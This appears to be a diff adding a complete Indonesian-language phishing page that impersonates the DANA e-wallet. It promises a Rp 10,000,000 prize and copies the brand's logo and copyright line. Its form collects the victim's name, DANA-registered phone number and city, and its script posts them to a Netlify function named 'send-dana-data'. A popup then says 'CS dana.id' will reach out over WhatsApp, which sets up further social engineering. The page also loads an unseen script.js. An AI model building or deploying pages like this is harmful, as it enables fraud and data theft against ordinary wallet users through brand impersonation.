@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulir Klaim Hadiah DANA</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* CSS yang sama seperti sebelumnya */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f8f9ff 0%, #f0f4ff 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #2d3748;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.12);
+            width: 100%;
+            max-width: 480px;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transform: translateZ(0);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+        }
+        
+        .container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.15);
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #4e54c8 0%, #8a64d6 100%);
+            color: white;
+            padding: 30px 25px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            transform: rotate(30deg);
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 12px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            position: relative;
+        }
+        
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
+            color: #2d3748;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-weight: bold;
+            margin: 12px 0;
+            font-size: 18px;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .badge::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(rgba(255,255,255,0.2), rgba(255,255,255,0));
+            transform: rotate(30deg);
+        }
+        
+        .header p {
+            font-size: 15px;
+            opacity: 0.9;
+            position: relative;
+        }
+        
+        .content {
+            padding: 35px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .logo span {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #4e54c8 0%, #8a64d6 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .logo span::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, #4e54c8, #8a64d6);
+            border-radius: 3px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 500;
+            color: #4a5568;
+            font-size: 15px;
+            padding-left: 5px;
+        }
+        
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 16px 20px;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            background: #f8fafc;
+            color: #2d3748;
+        }
+        
+        .form-group input:focus, .form-group select:focus {
+            border-color: #8a64d6;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(138, 100, 214, 0.15);
+            background: #fff;
+            transform: translateY(-2px);
+        }
+        
+        .form-group i {
+            position: absolute;
+            right: 20px;
+            top: 45px;
+            color: #a0aec0;
+            font-size: 18px;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #4e54c8 0%, #8a64d6 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(138, 100, 214, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(138, 100, 214, 0.3);
+        }
+        
+        .btn:hover::before {
+            left: 100%;
+        }
+        
+        .btn:active {
+            transform: translateY(1px);
+        }
+        
+        .info {
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+            border-left: 4px solid #8a64d6;
+            padding: 20px;
+            margin-top: 28px;
+            border-radius: 0 12px 12px 0;
+            font-size: 14px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
+        }
+        
+        .info p {
+            margin-bottom: 10px;
+            color: #4a5568;
+            display: flex;
+            align-items: flex-start;
+        }
+        
+        .info p i {
+            color: #8a64d6;
+            margin-right: 10px;
+            font-size: 16px;
+            margin-top: 3px;
+        }
+        
+        .info p:last-child {
+            margin-bottom: 0;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 25px;
+            color: #718096;
+            font-size: 13px;
+            border-top: 1px solid #e2e8f0;
+            background: #f8fafc;
+        }
+        
+        /* Popup Styles */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .popup-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .popup {
+            background: white;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 400px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
+            transform: translateY(50px);
+            opacity: 0;
+            transition: all 0.5s ease;
+            position: relative;
+        }
+        
+        .popup-overlay.active .popup {
+            transform: translateY(0);
+            opacity: 1;
+        }
+        
+        .popup-icon {
+            font-size: 60px;
+            color: #4e54c8;
+            margin-bottom: 20px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .popup h2 {
+            margin-bottom: 15px;
+            color: #4e54c8;
+            font-size: 24px;
+        }
+        
+        .popup p {
+            margin-bottom: 25px;
+            color: #4a5568;
+            line-height: 1.6;
+        }
+        
+        .popup-close {
+            background: linear-gradient(135deg, #4e54c8 0%, #8a64d6 100%);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .popup-close:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(138, 100, 214, 0.3);
+        }
+        
+        .whatsapp-button {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #25D366;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-weight: 600;
+            margin-top: 15px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+        
+        .whatsapp-button i {
+            margin-right: 10px;
+            font-size: 20px;
+        }
+        
+        .whatsapp-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
+        }
+        
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 500px) {
+            .content {
+                padding: 25px 20px;
+            }
+            
+            .header {
+                padding: 25px 20px;
+            }
+            
+            .header h1 {
+                font-size: 22px;
+            }
+            
+            .popup {
+                padding: 20px;
+            }
+        }
+        
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: #FFD700;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-gift"></i> Formulir Penerimaan Hadiah <i class="fas fa-gift"></i></h1>
+            <div class="badge">Rp 10.000.000</div>
+            <p>Selamat! Kamu berkesempatan menerima Hadiah</p>
+        </div>
+        
+        <div class="content">
+            <div class="logo">
+                <span>DANA</span>
+            </div>
+            
+            <form id="giftForm">
+                <div class="form-group">
+                    <label for="nama"><i class="fas fa-user"></i> Nama Lengkap:</label>
+                    <input type="text" id="nama" name="nama" required placeholder="Masukkan nama lengkap">
+                    <i class="fas fa-user-circle"></i>
+                </div>
+                
+                <div class="form-group">
+                    <label for="hp"><i class="fas fa-mobile-alt"></i> Nomor HP (yang terdaftar di DANA):</label>
+                    <input type="tel" id="hp" name="hp" required placeholder="Contoh: 081234567890">
+                    <i class="fas fa-phone"></i>
+                </div>
+                
+                <div class="form-group">
+                    <label for="kota"><i class="fas fa-city"></i> Kota/Kabupaten:</label>
+                    <input type="text" id="kota" name="kota" required placeholder="Masukkan kota/kabupaten">
+                    <i class="fas fa-map-marker-alt"></i>
+                </div>
+                
+                <button type="submit" class="btn" id="submitBtn">
+                    <i class="fas fa-paper-plane"></i> Klaim Hadiah Sekarang
+                </button>
+            </form>
+            
+            <div class="info">
+                <p><i class="fas fa-check-circle"></i> Hadiah ini gratis, bukan pembelian atau pembayaran.</p>
+                <p><i class="fas fa-check-circle"></i> Pastikan nomor DANA aktif agar hadiah dapat segera dikirim.</p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2025 DANA. Seluruh hak cipta dilindungi.</p>
+        </div>
+    </div>
+
+    <!-- Popup Konfirmasi -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup">
+            <div class="popup-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2>Terima Kasih!</h2>
+            <p>Hadiah sedang kami proses. Sebentar lagi kakak akan dihubungi oleh CS dana.id Indonesia melalui WhatsApp.</p>
+            <button class="popup-close" onclick="closePopup()">Mengerti</button>
+            <br>
+            <a href="#" class="whatsapp-button" id="whatsappBtn">
+                <i class="fab fa-whatsapp"></i> Buka WhatsApp Sekarang
+            </a>
+        </div>
+    </div>
+
+    <script>
+        const giftForm = document.getElementById('giftForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const whatsappBtn = document.getElementById('whatsappBtn');
+        
+        giftForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Validasi sederhana
+            const nama = document.getElementById('nama').value;
+            const hp = document.getElementById('hp').value;
+            const kota = document.getElementById('kota').value;
+            
+            if(nama && hp && kota) {
+                // Tampilkan loading state
+                submitBtn.innerHTML = '<span class="loader"></span> Mengirim data...';
+                submitBtn.disabled = true;
+                
+                try {
+                    // Kirim data ke Netlify Function
+                    const response = await fetch('/.netlify/functions/send-dana-data', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ nama, hp, kota }),
+                    });
+                    
+                    const result = await response.json();
+                    
+                    if (response.ok) {
+                        // Animasi konfeti sederhana
+                        createConfetti();
+                        
+                        // Update WhatsApp link dengan nomor pengguna
+                        whatsappBtn.href = `https://wa.me/?text=Halo,%20saya%20${encodeURIComponent(nama)}%20sudah%20mengklaim%20hadiah%20DANA`;
+                        
+                        // Tampilkan popup setelah 800ms
+                        setTimeout(function() {
+                            document.getElementById('popupOverlay').classList.add('active');
+                        }, 800);
+                    } else {
+                        alert('Terjadi kesalahan: ' + (result.error || 'Gagal mengirim data'));
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('Terjadi kesalahan jaringan. Silakan coba lagi.');
+                } finally {
+                    // Reset button state
+                    submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Klaim Hadiah Sekarang';
+                    submitBtn.disabled = false;
+                }
+            } else {
+                alert('Harap lengkapi semua data yang diperlukan.');
+            }
+        });
+        
+        function closePopup() {
+            document.getElementById('popupOverlay').classList.remove('active');
+            document.getElementById('giftForm').reset();
+        }
+        
+        function createConfetti() {
+            const colors = ['#FFD700', '#8a64d6', '#4e54c8', '#FFA500', '#4b6cb7'];
+            const container = document.querySelector('.container');
+            
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + '%';
+                confetti.style.top = -20 + 'px';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+                container.appendChild(confetti);
+                
+                const animationDuration = Math.random() * 2 + 2;
+                
+                // Animasi konfeti
+                confetti.animate([
+                    { top: '-20px', transform: 'rotate(0deg)' },
+                    { top: '100%', transform: `rotate(${Math.random() * 720}deg)` }
+                ], {
+                    duration: animationDuration * 1000,
+                    easing: 'cubic-bezier(0.1, 0.8, 0.3, 1)'
+                });
+                
+                // Hapus elemen setelah animasi selesai
+                setTimeout(() => {
+                    confetti.remove();
+                }, animationDuration * 1000);
+            }
+        }
+        
+        // Tutup popup ketika klik di luar area popup
+        document.getElementById('popupOverlay').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closePopup();
+            }
+        });
+    </script>
+  <!-- Di bagian akhir body, sebelum penutup tag </body> -->
+<script src="script.js"></script>
+</body>
+  </html>
